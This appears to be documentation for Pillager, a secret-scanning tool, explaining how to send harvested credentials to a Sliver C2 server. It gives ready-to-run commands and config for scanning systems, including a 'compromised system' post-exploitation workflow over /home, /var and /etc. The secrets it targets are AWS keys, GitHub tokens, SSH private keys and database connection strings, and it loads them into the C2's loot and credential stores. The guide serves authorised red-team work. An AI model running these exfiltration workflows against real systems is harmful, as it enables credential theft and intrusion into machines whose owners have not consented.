# Sliver C2 Exfiltration Guide

This guide explains how to use Pillager to exfiltrate discovered credentials to a [Sliver C2](https://github.com/BishopFox/sliver) server.

## Overview

Pillager can automatically send discovered secrets to your Sliver C2 server, storing them in both:
- **Loot storage** - JSON files containing all findings with metadata
- **Credential store** - Parsed credentials (AWS keys, GitHub tokens, SSH keys, etc.)

## Prerequisites

- A running Sliver C2 server
- An operator configuration file generated by the Sliver server
- The `pillager` binary

## Quick Start

### 1. Set Up Sliver Server

If you don't have a Sliver server running:

```bash
# Start the Sliver server
sliver-server
```

### 2. Generate Operator Configuration

**IMPORTANT**: Client configurations MUST be generated by the Sliver server. They contain per-user cryptographic key pairs and cannot be manually created.

In the Sliver console:

```bash
sliver > new-operator --name pillager-operator --lhost <your-server-ip> --lport 31337
```

This generates a JSON configuration file like:
```json
{
  "operator": "pillager-operator",
  "lhost": "192.168.1.100",
  "lport": 31337,
  "ca_certificate": "-----BEGIN CERTIFICATE-----\n...",
  "private_key": "-----BEGIN EC PRIVATE KEY-----\n...",
  "certificate": "-----BEGIN CERTIFICATE-----\n..."
}
```

The file will be saved to `~/.sliver-client/configs/pillager-operator_<ip>.cfg`

### 3. Run Pillager with Sliver Exfiltration

Use the `--exfil sliver` flag along with `--sliver-config` to specify your operator config:

```bash
# Scan current directory and send findings to Sliver
pillager hunt . --exfil sliver --sliver-config ~/.sliver-client/configs/pillager-operator_192.168.1.100.cfg

# Scan with specific rules and send to Sliver
pillager hunt /path/to/scan \
  --rules-path custom-rules.toml \
  --exfil sliver \
  --sliver-config /path/to/operator.cfg

# Scan with custom loot name
pillager hunt . \
  --exfil sliver \
  --sliver-config ~/.sliver-client/configs/operator.cfg \
  --sliver-loot-name "production-scan"
```

### 4. View Results in Sliver

After Pillager completes, check your Sliver server:

```bash
# View all loot
sliver > loot

# View stored credentials
sliver > creds

# View specific loot file
sliver > loot fetch <loot-id>
```

## Configuration Options

### Command Line Flags

```bash
--exfil sliver                     # Enable Sliver exfiltration (required)
--sliver-config <path>             # Path to Sliver operator config (required)
--sliver-loot-name <name>          # Custom name for loot files (default: "pillager-scan")
--sliver-loot-type <type>          # Loot type: "file", "credential", or "credentials" (default: "file")
--sliver-parse-creds               # Parse and store credentials separately (default: true)
```

**Note**: When `--sliver-parse-creds` is `true` (default), credentials are automatically parsed and stored in Sliver's credential store regardless of the `--sliver-loot-type` setting.

### Configuration File

You can also configure Sliver exfiltration in a TOML config file:

```toml
# pillager.toml
[exfil]
type = "sliver"

[exfil.sliver]
config_path = "~/.sliver-client/configs/operator.cfg"
loot_name = "production-scan"
loot_type = "file"
parse_credentials = true
```

Then run:
```bash
# Config file is automatically loaded from current directory
pillager hunt .

# Or specify a config file
pillager hunt . --config pillager.toml
```

## What Gets Exfiltrated

### Loot Files

All findings are packaged into a JSON file with metadata:

```json
{
  "metadata": {
    "hostname": "workstation-01",
    "timestamp": "2024-01-15T10:30:00Z",
    "version": "2.0.0",
    "finding_count": 15
  },
  "findings": [
    {
      "rule_id": "aws-access-key",
      "description": "AWS Access Key",
      "secret": "AKIAIOSFODNN7EXAMPLE",
      "file": "/home/user/.aws/credentials",
      "start_line": 2,
      "tags": ["aws", "credentials"]
    }
  ]
}
```

Loot files are named: `<loot-name>-YYYYMMDD-HHMMSS.json`

### Parsed Credentials

When `parse_credentials: true` (default), Pillager extracts structured credentials:

**Supported Credential Types:**
- **AWS** - Access keys and secret keys
- **GitHub** - Personal access tokens (PAT), OAuth tokens
- **SSH** - Private keys (RSA, EC, OpenSSH, DSA)
- **API Tokens** - Slack, Stripe, Twilio, SendGrid, Mailgun, Heroku
- **Databases** - PostgreSQL, MySQL, MongoDB, Redis, MSSQL connection strings
- **Generic Passwords** - Password fields with username extraction

Credentials appear in Sliver's credential store with names like:
- `AWS-AWS_ACCESS_KEY_ID`
- `GitHub-GitHub Personal Access Token`
- `SSH-SSH RSA Private Key`
- `PostgreSQL-dbuser`

## Example Workflows

### Development Environment Scan

Scan a project directory for secrets and send to Sliver:

```bash
pillager hunt ~/projects/my-app \
  --exfil sliver \
  --sliver-config ~/.sliver-client/configs/dev-operator.cfg \
  --sliver-loot-name "dev-scan-my-app"
```

### Red Team Assessment

Scan a compromised system and exfiltrate findings:

```bash
# From an implant or during post-exploitation
pillager hunt /home /var /etc \
  --exfil sliver \
  --sliver-config /tmp/operator.cfg \
  --sliver-loot-name "target-system-$(hostname)" \
  --workers 10
```

### Continuous Monitoring

Set up periodic scans:

```bash
#!/bin/bash
# scan-and-exfil.sh

TIMESTAMP=$(date +%Y%m%d-%H%M%S)
pillager hunt /critical/paths \
  --exfil sliver \
  --sliver-config ~/.sliver-client/configs/monitor.cfg \
  --sliver-loot-name "monitor-scan-$TIMESTAMP"
```

### Multiple Targets

Scan multiple directories:

```bash
for dir in /home/*; do
  pillager hunt "$dir" \
    --exfil sliver \
    --sliver-config ~/.sliver-client/configs/operator.cfg \
    --sliver-loot-name "scan-$(basename $dir)"
done
```

## Security Considerations

⚠️ **Protect Operator Configs**: They contain private keys that authenticate to your C2 server
⚠️ **Use Secure Transport**: Sliver uses mTLS - ensure your network path is secure
⚠️ **Clean Up Configs**: Remove operator configs from target systems after use
⚠️ **Audit Access**: Monitor which operators are connecting to your server

### Best Practices

1. **Generate Unique Configs**: Create separate operator configs for different operations
2. **Rotate Configs**: Regenerate configs periodically
3. **Delete Old Configs**: Remove configs from `~/.sliver-client/configs/` when no longer needed
4. **Monitor Server Logs**: Check Sliver server logs for authentication attempts
5. **Use Descriptive Names**: Name your loot files with context (system, date, operation)

## Troubleshooting

### "Failed to connect to Sliver teamserver"

- Verify the Sliver server is running
- Check network connectivity: `nc -zv <lhost> <lport>`
- Verify firewall rules allow connections on the specified port
- Ensure the operator config path is correct

### "Failed to load Sliver config"

- Use the EXACT file generated by Sliver (don't manually create/edit)
- Check file permissions (must be readable by your user)
- Verify the config file is valid JSON
- Use an absolute path or `~` for home directory

### "Authentication failed" / mTLS errors

- The operator config may be corrupted
- Regenerate the config: `sliver > new-operator --name <name> --lhost <ip>`
- The server's CA may have changed (if server was rebuilt)
- Check server logs for specific authentication errors

### No credentials appearing in Sliver

- Ensure `--sliver-parse-creds` is enabled (it's on by default)
- Check the loot file was created successfully
- Verify Pillager actually found credentials (check JSON output)
- Look for warnings in Pillager's output

### "Connection refused"

- Verify `lhost` and `lport` in the operator config match the running server
- Check if the server is listening: `netstat -tlnp | grep <lport>`
- Try connecting from the Sliver client console first to verify connectivity

## Advanced Usage

### Custom Loot Types

```bash
# Store findings as credential loot type
pillager hunt . \
  --exfil sliver \
  --sliver-config ~/.sliver-client/configs/operator.cfg \
  --sliver-loot-type credential
```

### Disable Credential Parsing

```bash
# Only store the raw JSON loot file, don't parse individual credentials
pillager hunt . \
  --exfil sliver \
  --sliver-config ~/.sliver-client/configs/operator.cfg \
  --sliver-parse-creds=false
```

### Combine with Other Outputs

```bash
# Send to Sliver AND save locally
pillager hunt . \
  --exfil sliver \
  --sliver-config ~/.sliver-client/configs/operator.cfg \
  --format json > findings.json
```

## Developer Testing

If you're developing Pillager and want to test the Sliver integration code, see [TESTING.md](TESTING.md) for information on running the test suite.

## Additional Resources

- [Sliver Documentation](https://github.com/BishopFox/sliver/wiki)
- [Sliver Multiplayer Mode](https://github.com/BishopFox/sliver/wiki/Multiplayer-Mode)
- [Pillager Documentation](../../../README.md)
- [Exfiltration Overview](../README.md)

